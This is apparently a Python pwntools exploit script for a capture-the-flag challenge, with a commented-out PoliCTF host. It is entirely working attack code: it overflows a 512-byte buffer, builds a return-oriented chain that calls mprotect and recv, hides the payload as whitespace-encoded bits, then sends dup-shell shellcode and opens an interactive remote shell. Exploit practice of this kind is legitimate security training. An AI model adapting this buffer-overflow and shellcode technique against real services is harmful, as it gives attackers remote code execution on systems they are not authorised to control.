#!/usr/bin/env python
from pwn import *
from pwn.i386.linux import dupsh, asm
from pwn.aeROPics import aeROPics, ropcall

sock = remote('localhost', 32000, timeout = None)
# sock = remote('pwn.challenges.polictf.it', 32000)

def send_cmd(s):
    sock.send(s.ljust(16, '\n'))

def send_data(s):
    sock.send(s.ljust(512, '\n'))

def send_pkt(cmd, data):
    send_cmd(cmd)
    send_data(data)

ebp = 0x42424242

codeaddr = 0x0804b090

shellcode = asm(dupsh(0))

a = aeROPics('./chal')
ropcall(a.plt.mprotect, (a.segments._got_plt, len(shellcode), 7))
ropcall(a.plt.recv, (0, codeaddr, len(shellcode), 0))
ropcall(codeaddr)


data = 'A' * 512 + p32(32)*3 + p32(ebp) + str(a)
data = ''.join('\t' if n=='1' else ' ' for n in bits(data, endian = 'big'))
data = data.ljust(512 * 10, ' ')

open('exploit', 'w').write('black'.ljust(16, '\n') + data + shellcode)

pause()

send_cmd('black')
sock.send(data)

# sleep(0.5)

sock.send(shellcode)

sock.interactive()

# data = sock.recvall()
# print enhex(data)
